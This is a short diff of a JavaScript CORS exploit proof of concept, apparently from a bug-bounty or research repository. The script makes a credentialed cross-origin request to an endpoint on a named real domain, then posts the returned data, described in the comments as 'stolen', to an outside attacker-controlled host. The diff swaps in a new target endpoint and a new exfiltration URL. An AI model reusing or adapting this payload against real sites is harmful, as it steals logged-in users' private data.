@@ -9,7 +9,7 @@
 
 <script>
     // 1. Send a request to the vulnerable endpoint to extract sensitive data
-    fetch('https://certinia.com/api/v1/user/profile', {
+    fetch('https://certinia.com/cdn-cgi/rum?', {
         method: 'POST',
         credentials: 'include',
         headers: { 'Content-Type': 'application/json' }
@@ -17,7 +17,7 @@
     .then(response => response.json())
     .then(data => {
         // 2. Send the stolen data to the attacker's server
-        fetch('https://example.balanced-amazing-citron.glitch.me/exfiltrate', {
+        fetch('https://devadathappu.github.io/corsvu/', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ stolen_profile: data })
